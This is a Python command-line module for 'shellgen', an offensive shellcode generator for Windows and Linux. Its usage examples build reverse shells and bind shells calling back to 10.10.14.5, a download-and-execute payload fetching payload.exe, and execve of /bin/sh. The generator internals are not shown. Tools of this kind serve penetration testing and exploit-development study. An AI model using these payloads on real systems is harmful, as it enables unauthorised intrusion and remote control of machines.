"""
Command Line Interface Module

Handles argument parsing and orchestration of the shellgen generation workflow.
"""

import argparse
import json
import sys

from lib.color_printer import printer

from .assembler import (
    assemble_to_binary,
    debug_shellcode_opcodes,
    print_bad_char_report,
    print_bad_char_summary,
    scan_shellcode_for_bad_chars,
    verify_shellcode_bad_chars,
)
from .formatters import format_output, print_usage_instructions
from .generators import LinuxGenerator, WindowsGenerator
from .payloads import get_payload_builder, list_payloads


def parse_bad_chars(bad_chars_str):
    """
    Parse comma-separated hex bytes into a list of integers.

    Args:
        bad_chars_str: Comma-separated hex bytes (e.g., "00,0a,0d")

    Returns:
        list: List of integer byte values
    """
    if not bad_chars_str:
        return [0x00, 0x0A, 0x0D]  # default

    bad_chars = []
    for byte_str in bad_chars_str.split(","):
        byte_str = byte_str.strip()
        try:
            if byte_str.startswith("0x") or byte_str.startswith("0X"):
                bad_chars.append(int(byte_str, 16))
            else:
                bad_chars.append(int(byte_str, 16))
        except ValueError:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text(f"Invalid hex byte: {byte_str}\n", "red")
            sys.exit(1)

    return bad_chars


def _convert_json_arg(arg):
    """Convert a JSON argument to the expected Python type.

    - Hex strings ("0x40000000") → int
    - JSON null (None) → 0 (NULL pointer)
    - Everything else passes through unchanged
    """
    if arg is None:
        return 0
    if isinstance(arg, str) and arg.startswith("0x"):
        try:
            return int(arg, 16)
        except ValueError:
            return arg  # not valid hex, keep as string
    return arg


def load_custom_json(json_path):  # noqa: C901
    """
    Load a custom payload configuration from a JSON file.

    Args:
        json_path: Path to JSON file

    Returns:
        dict: Payload configuration

    JSON Format:
        {
          "bad_chars": [0, 10, 13],
          "calls": [
            {
              "api": "MessageBoxA",
              "dll": "user32.dll",
              "args": [0, "Hello!", "Title", 0]
            }
          ],
          "exit": true
        }
    """
    try:
        with open(json_path, "r") as f:
            config = json.load(f)

        # Convert bad_chars list to set — supports ints, hex strings, or both
        # e.g. [0, 10, 13] or ["0x00", "0x0a", "0x0d"] or [0, "0x0a", 13]
        if "bad_chars" in config:
            config["bad_chars"] = {
                (
                    int(b, 16)
                    if isinstance(b, str) and b.startswith("0x")
                    else int(b) if isinstance(b, str) and b.isdigit() else b
                )
                for b in config["bad_chars"]
            }
        else:
            config["bad_chars"] = {0x00, 0x0A, 0x0D}  # default

        # Validate required fields
        if "calls" not in config:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("JSON must contain 'calls' array\n", "red")
            sys.exit(1)

        # Post-process args: convert hex strings to int, null to 0
        for call in config["calls"]:
            if "args" in call:
                call["args"] = [_convert_json_arg(a) for a in call["args"]]

        # Validate stack_alloc if present
        if "stack_alloc" in config:
            if not isinstance(config["stack_alloc"], list):
                printer.print_text("✗ ERROR: ", "bold red", end="")
                printer.print_text("'stack_alloc' must be an array\n", "red")
                sys.exit(1)
            for i, alloc in enumerate(config["stack_alloc"]):
                if "name" not in alloc or "size" not in alloc:
                    printer.print_text("✗ ERROR: ", "bold red", end="")
                    printer.print_text(
                        f"stack_alloc[{i}] must have 'name' and 'size'\n", "red"
                    )
                    sys.exit(1)
                alloc["size"] = (
                    int(alloc["size"], 16)
                    if isinstance(alloc["size"], str) and alloc["size"].startswith("0x")
                    else int(alloc["size"])
                )
                if "init_dword" in alloc:
                    alloc["init_dword"] = _convert_json_arg(alloc["init_dword"])

        # Set default exit if not specified
        if "exit" not in config:
            config["exit"] = True

        return config

    except FileNotFoundError:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"JSON file not found: {json_path}\n", "red")
        sys.exit(1)
    except json.JSONDecodeError as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Invalid JSON format: {e}\n", "red")
        sys.exit(1)
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error loading JSON: {e}\n", "red")
        sys.exit(1)


def create_parser():
    """Create and configure the argument parser."""
    parser = argparse.ArgumentParser(
        description="Multi-Architecture Shellcode Generator (x86/x64/ARM/ARM64)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Windows x86 MessageBox
  %(prog)s --platform windows --payload messagebox --title "Pwned" --message "Hello!"

  # Windows x86 command execution
  %(prog)s --platform windows --payload winexec --cmd "calc.exe" --arch x86

  # Windows x64 download & execute
  %(prog)s --platform windows --payload download_exec --url "http://10.10.14.5/payload.exe"

  # Windows x86 reverse shell
  %(prog)s --platform windows --payload reverse_shell --host 10.10.14.5 --port 443

  # Windows x86 bind shell (native socket)
  %(prog)s --platform windows --payload bind_shell --port 4444 --shell "cmd.exe"

  # Windows x86 bind shell (PowerShell - simple)
  %(prog)s --platform windows --payload bind_shell_simple --port 4444

  # Linux ARM64 reverse shell
  %(prog)s --platform linux --payload reverse_shell --host 10.10.14.5 --port 443 --arch arm64

  # Linux ARM bind shell
  %(prog)s --platform linux --payload bind_shell --port 4444 --arch arm --shell "/bin/sh"

  # Linux ARM32 execve
  %(prog)s --platform linux --payload execve --cmd "/bin/sh" --arch arm

  # Output as Python bytes
  %(prog)s --platform linux --payload execve --cmd "/bin/sh" --arch arm64 --format python

  # Avoid specific bad characters
  %(prog)s --platform windows --payload winexec --cmd "calc.exe" --bad-chars 00,0a,0d,20 --verify

  # List available payloads
  %(prog)s --list-payloads
        """,
    )

    parser.add_argument(
        "--list-payloads",
        action="store_true",
        help="List all available payloads and exit",
    )

    parser.add_argument(
        "--platform",
        choices=["windows", "linux"],
        help="Target platform: windows or linux",
    )

    parser.add_argument(
        "--payload", help="Payload name (use --list-payloads to see available options)"
    )

    parser.add_argument(
        "--arch",
        choices=["x86", "x64", "arm", "arm64"],
        default="x86",
        help="Architecture: x86 (default), x64, arm, arm64",
    )

    parser.add_argument(
        "--bad-chars",
        default="00",
        help="Comma-separated hex bytes to avoid (default: 00)",
    )

    # Payload-specific arguments
    parser.add_argument("--title", help="MessageBox title")
    parser.add_argument("--message", help="MessageBox message")
    parser.add_argument("--cmd", help="Command to execute")
    parser.add_argument(
        "--show-window",
        type=int,
        default=1,
        help="Window visibility (0=hidden, 1=normal)",
    )
    parser.add_argument("--url", help="URL to download from")
    parser.add_argument(
        "--save-path",
        default="C:\\\\temp\\\\payload.exe",
        help="Local save path for download",
    )
    parser.add_argument("--host", help="Target IP address for reverse shell")
    parser.add_argument(
        "--port",
        type=int,
        help="Port number (target port for reverse shell, listen port for bind shell)",
    )
    parser.add_argument(
        "--shell", help="Shell to execute (e.g., cmd.exe, powershell.exe, /bin/bash)"
    )

    # Custom JSON payload
    parser.add_argument(
        "--json",
        help="Load custom payload from JSON file (replaces --payload and payload-specific args)",
    )

    # Output options
    parser.add_argument(
        "--output", help="Output filename (if not specified, prints to stdout)"
    )

    parser.add_argument(
        "--format",
        choices=["asm", "python", "c", "raw", "pyasm"],
        default="asm",
        help="Output format (default: asm)",
    )

    parser.add_argument(
        "--verify",
        action="store_true",
        help="Verify assembled shellgen for bad characters (requires Keystone)",
    )

    parser.add_argument(
        "--debug-shellcode",
        action="store_true",
        help="Print opcodes line by line to identify bad characters",
    )

    parser.add_argument(
        "--no-exit",
        action="store_true",
        help="Skip ExitProcess at the end (Windows only)",
    )

    parser.add_argument(
        "--generate-completion",
        choices=["bash", "zsh"],
        metavar="SHELL",
        help="Print shell completion script and exit",
    )

    return parser


def validate_args(args):
    """Validate argument combinations."""
    if args.list_payloads:
        return  # No validation needed for --list-payloads

    # If using custom JSON, only platform is required
    if args.json:
        if not args.platform:
            printer.print_text("✗ ERROR: ", "bold red", end="")
            printer.print_text("--platform is required when using --json\n", "red")
            sys.exit(1)
        return  # Skip payload validation for JSON mode

    if not args.platform:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text("--platform is required ", "red", end="")
        printer.print_text(
            "(use --list-payloads to see available options)\n", "dim white"
        )
        sys.exit(1)

    if not args.payload:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text("--payload is required ", "red", end="")
        printer.print_text(
            "(use --list-payloads to see available options)\n", "dim white"
        )
        sys.exit(1)

    # NOTE: All architectures (x86, x64, ARM, ARM64) are now supported on both platforms
    # The generators are OS-specific and handle architecture-specific code generation


def _require_args(args, payload_name, **required):
    """Validate that required CLI arguments are present for a payload.

    Args:
        args: Parsed command-line arguments
        payload_name: Name of the payload (for error messages)
        **required: Mapping of arg_name -> display_name pairs to check

    Raises:
        SystemExit: If any required argument is missing
    """
    missing = [display for attr, display in required.items() if not getattr(args, attr)]
    if missing:
        flags = " and ".join(missing)
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"{flags} required for {payload_name} payload\n", "red")
        sys.exit(1)


def _build_messagebox_kwargs(args):
    _require_args(args, "messagebox", title="--title", message="--message")
    return {"title": args.title, "message": args.message}


def _build_winexec_kwargs(args):
    _require_args(args, "winexec", cmd="--cmd")
    return {"command": args.cmd, "show_window": args.show_window}


def _build_createprocess_kwargs(args):
    _require_args(args, "createprocess", cmd="--cmd")
    return {"command": args.cmd, "show_window": args.show_window}


def _build_shellexecute_kwargs(args):
    _require_args(args, "shellexecute", cmd="--cmd")
    kwargs = {"file_or_url": args.cmd, "show_cmd": args.show_window}
    if hasattr(args, "operation") and args.operation:
        kwargs["operation"] = args.operation
    if hasattr(args, "parameters") and args.parameters:
        kwargs["parameters"] = args.parameters
    return kwargs


def _build_system_kwargs(args):
    _require_args(args, "system", cmd="--cmd")
    return {"command": args.cmd}


def _build_download_exec_kwargs(args):
    _require_args(args, "download_exec", url="--url")
    return {"url": args.url, "save_path": args.save_path}


def _build_reverse_shell_kwargs(args):
    _require_args(args, args.payload, host="--host", port="--port")
    kwargs = {"host": args.host, "port": args.port}
    if args.shell:
        kwargs["shell"] = args.shell
    if args.platform == "linux":
        kwargs["arch"] = args.arch
    return kwargs


def _build_bind_shell_kwargs(args):
    _require_args(args, args.payload, port="--port")
    kwargs = {"port": args.port}
    if args.shell:
        kwargs["shell"] = args.shell
    if args.platform == "linux":
        kwargs["arch"] = args.arch
    return kwargs


def _build_bind_shell_simple_kwargs(args):
    _require_args(args, "bind_shell_simple", port="--port")
    kwargs = {"port": args.port}
    if args.cmd:
        kwargs["command"] = args.cmd
    return kwargs


def _build_execve_kwargs(args):
    _require_args(args, "execve", cmd="--cmd")
    kwargs = {"command": args.cmd, "arch": args.arch}
    if args.shell:
        kwargs["shell"] = args.shell
    return kwargs


_PAYLOAD_KWARGS_BUILDERS = {
    "messagebox": _build_messagebox_kwargs,
    "winexec": _build_winexec_kwargs,
    "createprocess": _build_createprocess_kwargs,
    "shellexecute": _build_shellexecute_kwargs,
    "system": _build_system_kwargs,
    "download_exec": _build_download_exec_kwargs,
    "reverse_shell": _build_reverse_shell_kwargs,
    "reverse_shell_x64": _build_reverse_shell_kwargs,
    "reverse_shell_powershell": _build_reverse_shell_kwargs,
    "bind_shell": _build_bind_shell_kwargs,
    "bind_shell_x64": _build_bind_shell_kwargs,
    "bind_shell_simple": _build_bind_shell_simple_kwargs,
    "execve": _build_execve_kwargs,
}


def build_payload_config(args, bad_chars):
    """
    Build payload configuration based on arguments.

    Args:
        args: Parsed command-line arguments
        bad_chars: List of bad character bytes

    Returns:
        dict: Payload configuration
    """
    try:
        builder = get_payload_builder(args.platform, args.payload)
    except ValueError as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"{e}\n", "red")
        printer.print_text(
            "\nUse --list-payloads to see available options.\n", "dim white"
        )
        sys.exit(1)

    kwargs = {"bad_chars": set(bad_chars)}

    kwargs_builder = _PAYLOAD_KWARGS_BUILDERS.get(args.payload)
    if kwargs_builder:
        kwargs.update(kwargs_builder(args))

    return builder(**kwargs)


def generate_shellcode(args, config):
    """
    Generate shellgen based on platform and configuration.

    Args:
        args: Parsed command-line arguments
        config: Payload configuration dict

    Returns:
        str: Generated assembly code
    """
    if args.platform == "windows":
        # Windows shellgen generation (x86, x64, ARM, ARM64)
        bad_chars = config.get("bad_chars", set())
        generator = WindowsGenerator(bad_chars, args.arch)
        return generator.generate(config)

    elif args.platform == "linux":
        # Linux shellgen generation (x86, x64, ARM, ARM64)
        bad_chars = config.get("bad_chars", set())
        generator = LinuxGenerator(bad_chars, args.arch)
        return generator.generate(config)

    else:
        raise ValueError(f"Unsupported platform: {args.platform}")


def _build_config_from_args(args):
    """Build payload config and bad_chars from CLI arguments or JSON.

    Returns:
        tuple: (config, bad_chars)
    """
    if args.json:
        config = load_custom_json(args.json)

        # Check if --bad-chars was explicitly provided (not just the default)
        if args.bad_chars != "00":
            bad_chars = parse_bad_chars(args.bad_chars)
            config["bad_chars"] = set(bad_chars)
            printer.print_text("ℹ ", "cyan", end="")
            printer.print_text(
                "Using bad_chars from CLI (overriding JSON): ", "dim white", end=""
            )
            printer.print_text(
                f"{{{', '.join(f'0x{b:02x}' for b in sorted(bad_chars))}}}\n", "yellow"
            )
        else:
            bad_chars = list(config.get("bad_chars", {0x00, 0x0A, 0x0D}))
            printer.print_text("ℹ ", "cyan", end="")
            printer.print_text("Using bad_chars from JSON: ", "dim white", end="")
            printer.print_text(
                f"{{{', '.join(f'0x{b:02x}' for b in sorted(bad_chars))}}}\n", "yellow"
            )
    else:
        bad_chars = parse_bad_chars(args.bad_chars)
        do_exit = not args.no_exit
        config = build_payload_config(args, bad_chars)

        # Set exit flag for Windows payloads
        if args.platform == "windows" and "exit" in config:
            if args.payload != "reverse_shell":
                config["exit"] = do_exit
            elif args.no_exit:
                config["exit"] = False

    return config, bad_chars


def _write_output(output_data, args):
    """Write formatted output to file or stdout."""
    if args.output:
        if args.format == "raw":
            with open(args.output, "wb") as f:
                f.write(output_data)
            printer.print_text("✓ ", "bold green", end="")
            printer.print_text(f"Raw binary written to: {args.output}\n", "green")
        else:
            with open(args.output, "w") as f:
                f.write(output_data)
            printer.print_text("✓ ", "bold green", end="")
            printer.print_text(f"Output written to: {args.output}\n", "green")
    else:
        if args.format == "raw":
            sys.stdout.buffer.write(output_data)
        else:
            print(output_data)


def _verify_shellcode(asm_code, arch, bad_chars):
    """Verify assembled shellcode for bad characters."""
    print("\n" + "=" * 72)
    print("VERIFYING ASSEMBLED SHELLCODE...")
    print("Assembler: Keystone Engine")
    print("=" * 72)
    try:
        shellcode_bytes = assemble_to_binary(asm_code, arch)
        is_clean, report = verify_shellcode_bad_chars(shellcode_bytes, bad_chars)
        print_bad_char_report(report, bad_chars)

        if not is_clean:
            sys.exit(1)

    except Exception as e:
        print("\n✗ Verification failed: Could not assemble shellgen")
        print(f"   {str(e)}")
        sys.exit(1)


def _post_generate(asm_code, bad_chars, args):
    """Scan, debug, verify, and print usage after generation."""
    try:
        shellcode_bytes = assemble_to_binary(asm_code, args.arch)
        scan_result = scan_shellcode_for_bad_chars(shellcode_bytes)
        print_bad_char_summary(scan_result)
    except Exception as e:
        print(f"\n[!] Warning: Could not scan for bad characters: {str(e)}")
        print("    (This is informational only - shellgen generation was successful)")

    if args.debug_shellcode:
        debug_shellcode_opcodes(asm_code, args.arch, bad_chars)

    if args.verify:
        _verify_shellcode(asm_code, args.arch, bad_chars)

    print_usage_instructions(args.output, args.format, args.payload, args.verify)


def run_cli():
    """Main CLI entry point."""
    from lib.completions import handle_completion

    if handle_completion(
        sys.argv[1:],
        create_parser,
        ["shellgen", "shellgen_cli.py"],
    ):
        return

    parser = create_parser()
    args = parser.parse_args()

    if args.list_payloads:
        print(list_payloads())
        sys.exit(0)

    validate_args(args)

    config, bad_chars = _build_config_from_args(args)

    # Generate shellgen
    try:
        asm_code = generate_shellcode(args, config)
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error generating shellgen: {e}\n", "red")
        sys.exit(1)

    # Format output
    try:
        output_data = format_output(
            asm_code, args.format, args.arch, args.platform, bad_chars=bad_chars
        )
    except Exception as e:
        printer.print_text("✗ ERROR: ", "bold red", end="")
        printer.print_text(f"Error formatting output: {e}\n", "red")
        sys.exit(1)

    _write_output(output_data, args)
    _post_generate(asm_code, bad_chars, args)
